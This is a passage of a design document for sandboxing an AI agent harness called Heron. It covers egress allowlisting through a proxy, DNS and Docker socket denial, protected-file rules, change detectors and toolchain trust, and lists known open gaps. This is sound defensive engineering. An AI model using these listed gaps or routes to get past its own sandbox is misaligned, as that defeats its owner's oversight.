    *   allow outbound to `localhost:*` (OQ4);
    *   deny `localhost:<p>` for Heron's own API port and for each port in `agent.deny_local_ports`;
    *   allow AF_UNIX sockets the process makes itself, and outbound connects only to sockets inside the writable folders;
    *   deny the DNS resolver `/private/var/run/mDNSResponder`, so names can't be looked up and lookups can't carry data out;
    *   deny the launchd SSH agent sockets.

    The Docker or OrbStack socket is outside the writable folders, so it is denied. That closes "ask the Docker daemon to fetch it".
*   **The environment.** After `env_allowed` (`src/tools/shell.rs:64-69`), the shell sets `HTTPS_PROXY`, `HTTP_PROXY`, `ALL_PROXY` and their lower-case forms to `http://127.0.0.1:<port>`. It sets `NO_PROXY` and `no_proxy` to `localhost,127.0.0.1,::1`. These replace any proxy variables the user's environment had.
*   **The settings** (`[agent]` in `config.toml`, and `/api/settings`):
    *   `egress = "allowlist"` (default) or `"open"`;
    *   `egress_allow`, the host list;
    *   `deny_local_ports`, default empty.

    With `open`, today's profile applies: no network rules and no proxy. Only the owner can set it, through the settings API, because the agent can't write `config.toml`.
*   **The default list.** These hosts are read-mostly. PT-E2 confirms they are enough.
    *   **Rust:** `index.crates.io`, `static.crates.io`, `static.rust-lang.org`
    *   **GitHub:** `github.com`, `codeload.github.com`, `objects.githubusercontent.com`, `release-assets.githubusercontent.com`
    *   **Python:** `pypi.org`, `files.pythonhosted.org`
    *   **Node:** `registry.npmjs.org`
*   **What breaks.** This is accepted by OD6, and the threat model and `docs/cli-providers.md` must say so:
    *   **Hosts not on the list.** Any shell command that reaches one fails. Examples: `curl` to an arbitrary site, `brew install`, `go get`, `git clone` from GitLab or Bitbucket, and `cargo search`, since `crates.io` is off the list. The model is told to use `web_fetch` for pages. That is the right tool anyway: t10's failed run used `curl` through the shell.
    *   **Plain HTTP, any port other than 443, and SSH.** `git@github.com:` remotes and `git push` over SSH stop working, and so does `ssh` itself.
    *   **Programs that ignore the proxy variables.** Examples are `ping`, `nc` to remote hosts, and some language runtimes with proxy support turned off. They fail closed.
    *   **DNS from inside the sandbox.** `nslookup`, `dig` and code that resolves names before it connects all fail.
    *   **Docker and OrbStack** from Heron's shell.
    *   **Background processes started by a command** lose outbound network when that command ends.
    *   **Linux and Windows:** nothing changes (G8).

#### 3.3 The after-run rehash

*   **The snapshot.** `protect::watch_begin(session_id, workspace, home)` runs lazily, on the first journaled call of a run. So read-only chats pay nothing. It does the bounded scan of §3.1 and records SHA-256 (or "missing") for:
    *   each protected file;
    *   each file in a protected folder;
    *   each repository's hooks and config.

    The snapshot is cached under the session id, and the shell's profile builder reads its repository list from it.
*   **The comparison.** `protect::watch_end(session_id)` runs when the run ends: every exit of `run_turn` at depth 0, through a drop guard, and the end of `run_parked`. It takes a fresh snapshot and compares the two. These changes are reported:
    *   any change to a protected file that existed;
    *   any new protected file;
    *   any new repository whose hooks are not git's samples, or whose config has keys outside `NEW_REPO_CONFIG_KEYS`.
*   **What a report does:**
    *   it sends `Event::Notice` to the turn's sink;
    *   it adds `store.add_inbox("Protected file changed", <paths>)`;
    *   it writes `store.audit(session, "protect", <paths>, "protected-path-changed", "")`.

    The report names the paths only, never their contents.
*   **It is a detector.** The run is not stopped or rolled back. Seatbelt and `classify_path` are the controls. The rehash catches what they can't: hard links (PT-P1), a process that outlived its command, or a gap in either rule.

#### 3.4 The toolchain hash check (the interface Pre-5 names)

*   **The manifest.**
    *   For each folder `~/.rustup/toolchains/<name>/`, the manifest covers every regular file under `bin/` and `lib/`, except `lib/rustlib/src/`. On the owner's Mac that is about 150 files and 600 MB per toolchain.
    *   `~/.cargo/bin/` is left out. The sandbox can't write there, and including it would make every `cargo install` the owner runs trip a refusal.
    *   For each file it records path, size, inode, mtime, ctime and SHA-256.
    *   `~/.cargo/registry` is not covered (OQ2).
*   **The baseline.** It is stored as JSON in kv `toolchain:baseline`.
    *   **Made by:** the first `check` in a build that has this feature, on trust-on-first-use, and afterwards only by `toolchain::trust_current`.
    *   **Who can call `trust_current`:** only the authenticated API, `POST /api/toolchain/trust`, which the app's Settings › Sandbox calls. `heron.db` is Refused to the sandbox, and no tool calls `trust_current`. So, as with a "never" lift, the agent can't re-trust (OQ6).
    *   **Cost:** making the baseline hashes about 1.2 GB for two toolchains, under a second at the speed of the `sha2` crate on Apple silicon. It runs on a blocking thread.
*   **The check.** `toolchain::check(store, home) -> ToolchainState` stats every manifest path, and every current file under the same roots, which shows new toolchains and new files. Only a file whose (size, inode, mtime, ctime) differs from the baseline is hashed again.
    *   **Why stat first is sound:** a process that isn't root can't set ctime, and replacing a file changes its inode. Checking about 300 paths takes well under a millisecond.
    *   **The result:**

        ```text
        enum ToolchainState {
            Trusted,
            NoBaseline,                                   // the first check makes one
            Changed { toolchains: Vec<String>, files: Vec<ChangedFile>, since: i64, during: Option<String> },
        }
        ```
*   **When it runs, in the shell tool:**
    1.  **Before each command.** If the state is `Changed` and the command line names a Rust tool (`cargo`, `rustc`, `rustup`, `rustdoc`, `rustfmt`, `clippy-driver` or `cargo-*`, as the first word of any part of the command), Heron refuses with "Heron won't run the Rust toolchain: <toolchain> changed since you last trusted it (<files>). Check it, then trust it in Settings › Sandbox." This message is the friendly half.
    2.  **The profile.** While the state is `Changed`, `seatbelt_profile` adds `(deny file-read* (subpath ~/.rustup/toolchains/<name>))` for each changed toolchain. This is the half that holds: "uses" (OD7) is enforced by the operating system for any route, not only for command lines that name cargo.
    3.  **After each command.** If the state was `Trusted` and is now `Changed`, Heron records `toolchain:changed` with `during` set to the command. It appends the "[toolchain] …" line to the output and adds an inbox entry (CUJ 8, OQ1).
*   **After the owner's own `rustup update`,** the next Heron cargo command is refused with the same message. Once the owner trusts the toolchain, it works again. This costs one click about every six weeks.
*   **What Harness2 calls.** Before it starts a repair run, it calls `toolchain::check`. On `Changed`, it does not start the run: it sets `triggers.state = setup_failed`, with the refusal text as the inbox note. A repair's own `cargo test` calls also go through the shell, so the refusal and the Seatbelt deny cover them too.

### 4. How each invariant is kept

*   **I1, the sandbox is on by default.**
    *   Nothing here adds a way to turn the sandbox off.
    *   `egress = "open"` only removes the network rules, and only the owner can set it, through the settings API.
    *   `sandbox::required()` and the refusal without Seatbelt (`src/tools/shell.rs:44-48`) are unchanged.
    *   The new rules only deny more.
*   **I2, a tainted conversation's grants never reach the shell.**
    *   The shell's read grants still come from `ctx.read_grants()`, which drops conversation grants once the conversation is tainted.
    *   An ask-again approval carries the taint of the original call. `run_parked` also re-reads the session's current taint for `shell` (`src/app.rs:1793-1795`).
    *   Egress decisions don't depend on grants.
*   **I3, "never" rules are lifted only in the app.**
    *   No "never" rule is touched.
    *   The three new owner-only actions use the same authenticated API as `DELETE /api/nevers`: widening egress, setting `egress = "open"`, and trusting the toolchain.
    *   The agent can't reach them: `config.toml` and `heron.db` are Refused, the API token is never written where the sandbox can read it, the shell profile denies Heron's own API port (OQ4), and no tool calls them.
    *   An ask-again approval can't create an "always" rule. `run_parked` runs exactly one call.
*   **I4, memory never trusts outside content.**
    *   A re-run `remember` goes through `run_parked` with its recorded `tainted` flag, so it is saved as unconfirmed, as today (`src/app.rs:1788-1795`).
    *   The journal, protect and toolchain code write no memories.

## Alternatives Considered

### A1: Use the audit log as the journal

*   **Pros:** it is already tamper-evident (`audit_row`, `src/store.rs:1312`), and an "intent" audit row before each call would be one line.
*   **Cons:**
    *   audit arguments are cut to 600 characters and redacted, so a call can't be re-run from them;
    *   the table is append-only by trigger, so its state can't move to `asked`.
*   **Reason for rejection:** a re-run needs the full arguments and a state that changes. The audit log still records every journaled call when it finishes, as today.

### A2: Use the `approvals` table as the journal

*   **Pros:** it already has `running` and `unknown` states and the full arguments.
*   **Cons:** every side-effecting call would become an approval row, which floods the Approvals list and its count.
*   **Reason for rejection:** it mixes "asked the user" with "did something". The journal follows the `job_runs` pattern instead (`claim_due_job`, `recover_interrupted_jobs`) and creates an approval only when it must ask.

### A3: Recover by process id instead of lease files

*   **Pros:** no files.
*   **Cons:** process ids are reused, and checking one needs the start time, which differs between platforms.
*   **Reason for rejection:** an operating-system file lock is released on any death and is already the pattern in use (`background.lock`).

### A4: Keep `recent_calls` and add `RepeatGuard` beside it

*   **Reason for rejection:** two checks would see the same calls, and they could disagree on what counts as "the same". `RepeatGuard.count()` reproduces the nudge's threshold exactly.

### A5: Seatbelt host rules, or a fixed IP list

*   **Reason for rejection:** Seatbelt accepts only `localhost` or `*` as a host. IP lists for CDN-hosted registries change without notice. Nothing outside a proxy sees the host name.

### A6: A packet filter (`pf`) or a Network Extension content filter

*   **Pros:** they catch every process, not just those that honour proxy variables.
*   **Cons:**
    *   `pf` needs root, and its rules are system-wide;
    *   a content filter needs a signed system extension, a special entitlement and the owner's approval in System Settings, and it can't tell Heron's sandboxed commands from the owner's own.
*   **Reason for rejection:** both cost far more, and Seatbelt's loopback-only rule already makes the proxy the only exit.

### A7: Deny all network to sandboxed commands

*   **Reason for rejection:** `cargo test --locked` with a new dependency, `npm install` and `uv sync` all stop working, and Harness2's repair loop needs cargo.

### A8: A TLS-decrypting proxy that filters methods and paths

*   **Pros:** it could block `git push` and `npm publish` to allowed hosts (OQ5).
*   **Cons:**
    *   it needs a local certificate authority that every tool trusts;
    *   it breaks certificate pinning;
    *   it puts every credential the command sends through Heron in clear text.
*   **Reason for rejection:** it costs too much and widens risk. `publish` is already Forbidden at the command line.

### A9: Make protected paths ask (`Privileged`) rather than refuse

*   **Pros:** "add this alias to my .zshrc" would still work, after one approval.
*   **Cons:** one misread approval puts code in a file that runs on every new shell.
*   **Reason for rejection:** OD5 says read-only. The owner edits these files himself.

### A10: Hash the whole toolchain before every command

*   **Reason for rejection:** about 1.2 GB per check, which would add half a second or more to every shell command. Checking stat data first gives the same answer for any process that isn't root.

### A11: Deny sandbox writes to the toolchains

*   **Pros:** there is nothing to check. It also closes the window in OQ1 for the owner's own builds.
*   **Cons:** a sandboxed `rustup` install or an auto-install from `rust-toolchain.toml` no longer works.
*   **Reason for rejection:** the owner decided to keep writes allowed (OD7). It stays the recommended change in OQ1.

--------------------------------------------------------------------------------

## Non-Functional Requirements

### Security and Privacy

*   **What a journal row holds.** Full arguments are kept only while an intent is open. Then only the hash and a redacted preview remain. Rows are deleted after 30 days.
*   **What the reports hold.** Notices and inbox entries name paths, hosts and tools, never file contents.
*   **What stays open, for `docs/engineering/SECURITY_THREAT_MODEL.md`:**
    *   uploads to allowed hosts that accept writes (OQ5);
    *   local forwarding proxies (OQ4);
    *   the window before the toolchain notice, and `~/.cargo/registry/src` (OQ1, OQ2);
    *   hard links, if PT-P1 shows Seatbelt allows them;
    *   power loss between a tool's effect and its intent commit.
*   **No accepted-risk entry.** No new `## R-` entry is added to `docs/ACCEPTED_RISKS.md`, because that file is capped at 3 entries. These are threat-model notes. They go with Harness2's HQ2 entry, which relies on this sandbox.

### Performance

*   **Journal:** two small commits per side-effecting call. Read-only calls are unchanged.
*   **Protect:** one bounded scan at a run's first side-effecting call and one at its end. A typical project folder takes milliseconds. The cap is 100,000 entries.
*   **Toolchain:** about 300 stat calls before and after each shell command.
*   **Egress:** one loopback listener for each shell command.

### Rollout and Rollback

*   **The data format.** Step 4 only adds a table. An older build refuses a newer database, as it does today.
*   **Switches that roll back:** `egress = "open"` and `max_repeats = 0`.
*   **No switch:** the journal, protected paths and the toolchain check have none. Each only adds asks or refusals, and removing one weakens a stated goal.

--------------------------------------------------------------------------------

### Additional Resources

*   **Harness research:** `00-synthesis.md` and `A-harness2-vs-heron.md` (2026-11-22, the harness research folder).
*   **anchor-harness** (`~/Documents/PERSONAL/anchor-harness`):
    *   `crates/harness-core/src/effects.rs`;
    *   `crates/harness-core/src/repeats.rs`;
    *   `crates/harness-runtime/src/protect.rs`, `proxy.rs` and `sandbox.rs`;
    *   its genesis claims `evals/genesis/egress-claim` and `protection-claim`.
*   **[heron-harness2.md](heron-harness2.md):** "Harness parts from the review session's design", "When a run fails", §2 "The repair run" and Pre-5.

### Future Improvements

*   **A separate `CARGO_HOME` registry for sandboxed commands** (OQ2). It closes the `registry/src` route to the owner's builds.
*   **Egress rules on Linux.** These would use anchor-harness's bubblewrap network namespace and proxy bridge.
*   **A per-host approval** ("allow `gitlab.com` for this command"). It would be untainted conversations only, and never saved from an approval.
*   **Egress for the CLI provider children,** with the provider's API hosts as their allowlist.

--------------------------------------------------------------------------------

## Detailed Implementation Plan

### Pre-steps (the build session, before `skein run`)

*   **Pre-S1, skeleton.** Commit:
    *   `pub mod journal; pub mod repeat; pub mod egress; pub mod protect; pub mod toolchain;` in `src/lib.rs`;
    *   each module as an empty `mod.rs`;
    *   the new `AgentConfig` fields with their defaults: `max_repeats`, `egress`, `egress_allow` and `deny_local_ports`;
    *   `pub(crate) fn with_conn<T>(&self, f: impl FnOnce(&mut Connection) -> Result<T>) -> Result<T>` on `Store`, and `to_v4` in `STEPS` pointing at a stub `journal::sql::step` that W1 fills in.

    Five parallel units can't each edit `src/lib.rs`, `src/config.rs` or `src/store.rs`, and W1 needs database access before W6 runs. `Store::db()` stays private. Check: `cargo build --locked && cargo test --locked --no-run`.
*   **Pre-S2, prototypes.** Run PT-E1, PT-E2, PT-P1 and PT-T1 unsandboxed. Put their output in the PR description. If PT-E1 fails, stop and revise §3.2 before W3.

### Target Files to Create/Modify

#### 1. `src/journal/mod.rs`, `src/journal/sql.rs`, `src/journal/lease.rs` (Create, W1)

*   **Type / Scope:** Rust module.
*   **Proposed changes:**
    *   **`sql.rs`:** the `effects` schema as `pub fn step(tx: &Transaction)`, plus plain functions over `&Connection`:
        *   `insert_intent`;
        *   `finish` (sets the state, outcome and `finished_at`, and sets `args` to NULL);
        *   `open_procs`;
        *   `mark_interrupted(proc)`;
        *   `set_asked(id, approval_id)`;
        *   `prune(older_than)`.
    *   **`lease.rs`:** `Lease::acquire(home) -> Lease` (create the file and hold the lock for the process's life), and `Lease::is_dead(home, proc) -> bool` (`try_lock` succeeds).
    *   **`mod.rs`:**
        *   the `Intent`, `ActionIntent` and `Outcome` types;
        *   `guarded(store, intent, fut)`;
        *   `begin_action` and `finish`;
        *   `recover(store, home) -> Vec<Interrupted>`;
        *   `ask_again(store, &Interrupted)`, which builds the `park_approval` arguments and texts of §1.5;
        *   the `Resumer` trait;
        *   `register_resumer` and `resumer(name)`;
        *   `args_hash` (canonical JSON, then SHA-256).

    It reaches the database only through `Store::with_conn` from Pre-S1. The unit tests use `Store::in_memory()` and the `sql` functions directly.
*   **Tests:**
    *   `intent_without_outcome_is_interrupted_only_when_its_process_is_dead`
    *   `a_live_process_intent_is_left_alone`
    *   `finished_rows_drop_their_arguments`
    *   `interrupted_tool_call_becomes_one_ask_again_approval`
    *   `interrupted_parked_call_reopens_its_own_approval`
    *   `interrupted_action_uses_its_label`, which asserts the exact text "Repair #12 was interrupted. Run again?"
    *   `unknown_resumer_fails_cleanly`
    *   `args_hash_ignores_key_order`
    *   `prune_keeps_open_intents`

#### 2. `src/repeat/mod.rs` (Create, W2)

*   **Type / Scope:** Rust module, ported.
*   **Proposed changes:** `RepeatGuard`, `observe`, `count`, `mask_digits`, `DEFAULT_LIMIT = 4` and `MAX_PERIOD = 3`, from anchor-harness `repeats.rs`, with the fingerprint built on `sha2` and canonical JSON.
*   **Tests:** anchor-harness's six tests, ported, plus `nudge_threshold_is_three_identical_calls`.

#### 3. `src/egress/mod.rs`, `src/egress/proxy.rs` (Create, W3)

*   **Type / Scope:** Rust module, ported.
*   **Proposed changes:**
    *   **`proxy.rs`:** anchor-harness `proxy.rs`, without its Linux unix-socket bridge:
        *   `start(allow: Vec<String>) -> EgressProxy { port, decisions() }`;
        *   `host_allowed`;
        *   the public-address check;
        *   the SNI check;
        *   CONNECT to port 443 only.
    *   **`mod.rs`:**
        *   `seatbelt_rules(deny_local_ports, writable) -> String`, the §3.2 rules, which are pure text;
        *   `proxy_env(port) -> Vec<(String, String)>`;
        *   `blocked_note(decisions) -> Option<String>`;
        *   `DEFAULT_ALLOW`.
*   **Tests:** anchor-harness's proxy tests, plus:
    *   `profile_denies_everything_but_loopback`
    *   `deny_local_port_overrides_loopback`
    *   `resolver_socket_is_denied`
    *   `blocked_hosts_are_named_once`
    *   `default_list_has_no_crates_io_api_host`

    The proxy tests bind loopback ports, so the supervisor runs this check (see Run notes).

#### 4. `src/protect/mod.rs`, `src/protect/scan.rs` (Create, W4)

*   **Type / Scope:** Rust module.
*   **Proposed changes:**
    *   **`mod.rs`:**
        *   the constants `WORKSPACE_NAMES`, `HOME_PATHS`, `GIT_PARTS` and `NEW_REPO_CONFIG_KEYS`;
        *   `is_protected(path, workspace, home, heron_homes) -> Option<&'static str>`, which returns the reason shown to the user;
        *   `seatbelt_rules(workspace, home, &Scan) -> (String, Vec<PathBuf>)`, the rules and the paths to pass to `refused_ancestors`;
        *   `watch_begin` and `watch_end`, with a process-wide map keyed by session id;
        *   `Snapshot::diff -> Vec<Changed>`.
    *   **`scan.rs`:** the bounded scan, including how a `.git` file is resolved.
*   **Tests:**
    *   `protected_names_match_at_any_depth`
    *   `git_file_resolves_to_common_dir`
    *   `new_repo_with_sample_hooks_is_not_a_change`
    *   `new_repo_with_hooks_path_is_a_change`
    *   `heron_default_home_is_protected_when_home_is_overridden`
    *   `rules_cover_rename_of_a_parent`
    *   `scan_stops_at_the_limit`
    *   `snapshot_diff_reports_paths_only`

#### 5. `src/toolchain/mod.rs` (Create, W5)

*   **Type / Scope:** Rust module.
*   **Proposed changes:**
    *   `Manifest::read(home)`;
    *   `check(store, home) -> ToolchainState`;
    *   `trust_current(store, home)`;
    *   `names_rust_tool(command) -> bool`;
    *   `seatbelt_denies(&ToolchainState, home) -> String`;
    *   `note_after(store, before, after, command) -> Option<String>`.

    The baseline lives in kv `toolchain:baseline`, through the public `kv_get` and `kv_set`.
*   **Tests:**
    *   `changed_binary_is_reported`
    *   `touch_without_content_change_is_not_a_mismatch`, which rehashes and finds equal content, then refreshes the stat data
    *   `new_toolchain_folder_is_a_change`
    *   `rust_src_is_ignored`
    *   `names_rust_tool_finds_cargo_after_a_pipe`
    *   `untrusted_toolchain_is_read_denied`
    *   `trust_resets_state`

    These tests use a fake home in a temporary folder.

#### 6. `src/store.rs` (Modify, W6)

*   **Proposed changes:**
    *   Add `reopen_approval(id, summary, detail)`, which sets a `running` approval back to `new` with the ask-again texts.
    *   Have `maintain()` call `journal::sql::prune(30 days)` through `with_conn`.
    *   `to_v4` and `with_conn` already exist from Pre-S1. `Store::db()` stays private (`src/store.rs:778`).

#### 7. `src/agent.rs` (Modify, W6)

*   **Proposed changes:**
    *   Add the `run_id` field. `run_turn` sets it at depth 0, and `delegate`'s clone inherits it.
    *   In `execute_call`, when `risk.mutates()`, call `protect::watch_begin` once per run, then wrap `tool.call` in `journal::guarded`.
    *   Replace `recent_calls` with `RepeatGuard`: keep the nudge at `count() >= 3`, and on a stop reason send the notice and go to the closing call with the stop notice.
    *   Add a drop guard in `run_turn` at depth 0 that calls `protect::watch_end` and sends any report.
*   **Tests:**
    *   `ab_loop_stops_the_turn_with_a_notice`
    *   `failing_call_with_changing_digits_stops`
    *   `changing_success_output_does_not_stop`
    *   `max_repeats_zero_keeps_only_the_nudge`
    *   `mutating_call_writes_intent_before_running`
    *   `read_only_call_writes_no_journal_row`
    *   `delegate_child_shares_the_run_id`
    *   `protected_change_during_turn_is_reported_once`

#### 8. `src/app.rs` (Modify, W6)

*   **Proposed changes:**
    *   `own_background_work`: call `journal::recover` then `journal::ask_again` before `recover_interrupted_approvals`.
    *   `scheduler_loop`: call `journal::recover` on each tick.
    *   `run_parked`: wrap the call in `journal::guarded` with run `parked:<id>`, send `resume:` names to the resumer, and add `protect::watch_begin` / `watch_end` around the call.
    *   Set `job:<id>` as the run id for job and automation agents.
*   **Tests:**
    *   `crash_mid_call_asks_again_after_restart`, which simulates the crash by dropping the lease and leaving the intent
    *   `ask_again_rerun_rechecks_todays_rules`
    *   `ask_again_keeps_the_calls_taint`
    *   `resume_action_calls_the_resumer_and_dismiss_calls_declined`
    *   `parked_approval_interrupted_is_asked_once`

#### 9. `src/permissions.rs` (Modify, W6)

*   **Proposed changes:** in `classify_path`, when `write` is true and `protect::is_protected` matches any form of the path, return `Refused`. The reason text appears in the deny message.
*   **Tests:**
    *   `git_hook_write_is_refused_in_every_mode`
    *   `envrc_at_depth_is_refused`
    *   `zshrc_write_is_refused_not_asked`
    *   `protected_read_is_unchanged`

#### 10. `src/sandbox.rs` (Modify, W6)

*   **Proposed changes:**
    *   `Profile::Shell` gains `protect: &protect::Scan`, `egress: Option<EgressRules>` (port and denied local ports) and `toolchain: &ToolchainState`.
    *   The `Shell` branch appends `protect::seatbelt_rules`, `refused_ancestors` over the protected paths, the egress rules when `Some`, and `toolchain::seatbelt_denies`, in that order and before `launch`.
    *   The existing tests' `Profile::Shell { grants: vec![] }` gain the empty defaults.
    *   The `Cli` branch is unchanged.
*   **Tests:**
    *   `shell_profile_denies_protected_writes_after_the_writable_allowance`
    *   `egress_off_leaves_network_rules_out`
    *   `untrusted_toolchain_is_denied_in_the_profile`
    *   `cli_profile_has_no_egress_rules`

#### 11. `src/server.rs` (Modify, W6)

*   **Proposed changes:**
    *   `GET /api/toolchain` returns the state.
    *   `POST /api/toolchain/trust` calls `trust_current` and returns the new state.
    *   The `answer_approval` `dismiss` branch calls `Resumer::declined` for `resume:` names.
    *   `/api/settings` reads and writes the four new fields.
*   **Tests:**
    *   `toolchain_trust_needs_the_token`
    *   `dismiss_of_resume_approval_reaches_declined`

#### 12. `src/tools/shell.rs` (Modify, W6)

*   **Proposed changes:** in `run`:
    1.  Before spawning, call `toolchain::check`, and refuse if it is `Changed` and `names_rust_tool(command)`.
    2.  When `cfg.agent.egress == "allowlist"` and the sandbox is Seatbelt, call `egress::start(cfg.agent.egress_allow)`.
    3.  Build the profile with the run's protect scan (from the session's watch, or a fresh scan), the egress rules and the toolchain state.
    4.  After `env_allowed`, set the proxy variables.
    5.  After the command, append `egress::blocked_note` and `toolchain::note_after`.

    On Linux and Windows only the toolchain refusal applies.
*   **Tests:** these run real `sandbox-exec`, so the supervisor runs them.
    *   `sandboxed_curl_to_unlisted_host_is_blocked_and_named`
    *   `cargo_fetch_through_proxy_works`
    *   `loopback_test_server_is_reachable`
    *   `dns_lookup_fails_in_sandbox`
    *   `shell_write_to_git_hook_is_denied`
    *   `toolchain_change_is_reported_after_the_command`
    *   `disguised_cargo_is_denied_by_the_profile`

#### 13. Mac app, `macos/HeronMac/Sources/HeronUI/Views/` and `Stores/`, `macos/HeronMac/Sources/HeronCore/` (Modify, W8)

*   **Proposed changes:**
    *   A "Sandbox" section in Settings with:
        *   the egress mode;
        *   an editable host list and a list of denied local ports;
        *   the toolchain state with **Trust the Rust toolchain as it is now**.
    *   `CoreClient` gains `toolchain()` and `trustToolchain()`.
    *   Ask-again approvals need no change: they are ordinary parked approvals.
*   **Tests:** `test_sandboxSettingsShowsChangedToolchain`, `test_trustToolchainCallsCore` and `test_egressHostListRoundTrips` in `SandboxSettingsTests`.

#### 14. Documents (Modify, W7)

*   **`docs/engineering/SECURITY_THREAT_MODEL.md`:** what stays open, from [Security](#security-and-privacy).
*   **`docs/cli-providers.md`:** what breaks under the egress allowlist, and the default host list.
*   **`docs/designs/heron-harness2.md`:** no change is needed while the names in §1.5 and §3.4 hold. If they change, Harness2 is updated in the same change, as Pre-5 requires.

### Verification Plan

*   **Compilation and build:** `cargo build --locked`, and `swift build --package-path macos/HeronMac`, which the supervisor runs.
*   **Unit tests:** each unit's check in the table below, then `cargo test --locked` for the full suite. It must run unsandboxed, because Heron's own shell and server tests need real Seatbelt and loopback binding.
*   **Static analysis:** `cargo clippy --locked --all-targets -- -D warnings`.
*   **Test quality:** **testteeth**. `testteeth run --base main --fail-under 70` grades the branch by mutation. Every surviving mutant in `src/journal/`, `src/repeat/`, `src/egress/`, `src/protect/` and `src/toolchain/` is killed with a new test, or recorded as equivalent with evidence. One known equivalent: rusqlite's default 5 s busy timeout.
*   **genesis:** does not apply. Nothing in this doc judges or scores outputs. anchor-harness's genesis claims for egress and protection are cited as evidence for the ported design, not re-run here.
*   **End to end, by hand on the owner's Mac after `verify`:**
    *   CUJ 1, by killing the core during `sleep 30 && touch done` run through the shell;
    *   CUJ 7 and CUJ 8, in the app;
    *   PT-E1 to PT-T1 again, on the final build.

**Run notes.**

*   **Unsandboxed checks.** Checks that bind ports, run `sandbox-exec` or run `swift` fail inside a skein node's sandbox: W3, W6, W8 and verify. The skein supervisor runs those checks.
*   **Why `shell.rs` is in W6.** W6 changes `Profile::Shell`, which `src/tools/shell.rs:44` constructs. Splitting them would leave W6's check unable to compile.
*   **Test names.** When a node can't run its own check, it confirms its test names with `cargo test --locked --lib -- --list | grep`.
*   **Timeouts.** The verify node gets `--verify-timeout 3600`.

## Work units

| id | what to build | scope (one dir glob) | depends on | check (shell command that exits 0) | model role |
|---|---|---|---|---|---|
| W1 | Effect journal module: schema step, SQL functions, process leases, recovery, ask-again texts, `Resumer` hook (§1, file 1) | `src/journal/**` | — | `cargo test --locked --lib -- journal::` | hardest tasks: opus high |
| W2 | `RepeatGuard` ported from anchor-harness `repeats.rs` with its tests (§2, file 2) | `src/repeat/**` | — | `cargo test --locked --lib -- repeat::` | feature, refactoring: sonnet high |
| W3 | Egress proxy ported from anchor-harness `proxy.rs`, Seatbelt network rules, proxy env, blocked-host note (§3.2, file 3) | `src/egress/**` | — | `cargo test --locked --lib -- egress::` | feature, refactoring: sonnet high |
| W4 | Protected list, `is_protected`, Seatbelt write rules, bounded scan, snapshots and diff (§3.1, §3.3, file 4) | `src/protect/**` | — | `cargo test --locked --lib -- protect::` | feature, refactoring: sonnet high |
| W5 | Toolchain manifest, stat-then-hash check, trust, Rust-tool detection, profile denies (§3.4, file 5) | `src/toolchain/**` | — | `cargo test --locked --lib -- toolchain::` | feature, refactoring: sonnet high |
| W6 | Wire the modules into the core: `reopen_approval`, `execute_call`, `run_turn`, `run_parked`, recovery, `classify_path`, `seatbelt_profile`, API routes, and the shell tool's proxy, toolchain and protect calls (files 6 to 12) | `src/**` | W1, W2, W3, W4, W5 | `cargo test --locked --lib -- agent:: app:: permissions:: sandbox:: store:: server:: tools::shell::` | hardest tasks: opus high |
| W7 | Threat-model notes and the egress section of the CLI providers guide (file 14) | `docs/**` | W6 | `grep -q 'egress allowlist' docs/engineering/SECURITY_THREAT_MODEL.md && grep -q 'index.crates.io' docs/cli-providers.md` | feature, refactoring: sonnet high |
| W8 | Mac app Settings › Sandbox: egress mode and lists, toolchain state and Trust (file 13) | `macos/HeronMac/**` | W6 | `swift test --package-path macos/HeronMac --filter SandboxSettingsTests` | feature, refactoring: sonnet high |
| verify | Full suite, lint and the test-quality gate on the branch | `docs/designs/heron-harness-safety.md` (check only) | W6, W7, W8 | `cargo test --locked && cargo clippy --locked --all-targets -- -D warnings && testteeth run --base main --fail-under 70` | feature, refactoring: sonnet high |
